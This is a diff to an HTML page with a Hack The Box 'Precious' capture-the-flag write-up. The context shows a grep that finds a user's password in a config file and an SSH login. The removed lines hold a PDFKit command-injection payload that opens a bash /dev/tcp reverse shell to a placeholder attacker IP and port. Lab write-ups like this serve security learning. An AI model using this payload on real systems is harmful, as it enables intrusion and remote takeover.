@@ -128,9 +128,7 @@
             <br>So I tinkered round a little bit, and found a user called "Henry", but wasnt able to read the user.txt at /home/henry/user.txt.
             <br>With '<md> grep "henry" -r 2>/dev/null </md>' I found a config-file in '<md> /home/ruby/.bundle/ </md>' containing henrys password!
             <br>Started a ssh-session as henry and got the user flag.
-            <br>Found a <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">PoC</a> on snyk's Website. And came up with following Payload:  <p-js> http://example.com/?name=#{'%20`bash -c "/bin/bash -i >&amp; /dev/tcp/[ATTACKER IP]/[PORT] 0>&amp;1"`'} </p-js>
-            <br>Spun up a netcat listener and catched a reverse shell! </p>
-            <br>
+            </p>
             <img src="/Website/writeups/HTB/PRECIOUS/media/PRECIOUS4.png" alt="website" class="center">
             <br>
             <br>
